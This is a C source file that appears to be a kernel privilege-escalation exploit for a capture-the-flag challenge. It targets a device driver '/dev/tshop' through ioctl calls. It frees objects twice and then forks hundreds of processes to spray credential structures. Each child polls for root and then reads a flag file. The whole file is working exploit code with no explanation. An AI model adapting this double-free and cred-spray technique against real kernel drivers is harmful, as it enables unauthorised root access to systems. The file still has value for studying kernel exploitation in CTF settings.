#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <errno.h>
#include <linux/fs.h>
#include <semaphore.h>
#include <sys/prctl.h>
#include <sys/timerfd.h>
#include <sys/reg.h>

#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE);\
                        }while(0)

int fd;

void getZege(uint32_t index)
{
    ioctl(fd, 0x22B8, index);
}

void add(uint32_t index)
{
    ioctl(fd, 0x271A, index);
}

void del(uint32_t index)
{
    ioctl(fd, 0x2766, index);
}

void getJige(uint32_t index)
{
    ioctl(fd, 0x1A0A, index);
}

void init()
{
    if ((fd=open("/dev/tshop", O_RDWR)) == -1)
        errExit("open tshop");
}

void checkwin()
{
    while(1) {
        sleep(1);
        if (getuid() == 0){
            puts("spaw root shell!");
            system("cat /home/sunichi/flag");
            exit(0);
        }
    }
}

int main()
{
    pid_t child_pid;
    init();
    for(int i=0; i<0x10; i++)
        add(i);
    for(int i=0; i<0x10; i++)
        del(i);
    child_pid = fork();
    if(child_pid)
    {
        for(int i=0; i<0x200; i++)
        {
            child_pid = fork();
            if (child_pid == 0)
                checkwin();
        }
    }
    else if(child_pid == 0)
    {
        for(int i=0; i<0x10; i++)
        {
            del(i);
            add(i);
        }
    }
    else
        errExit("fork error!");
    return 0;
}





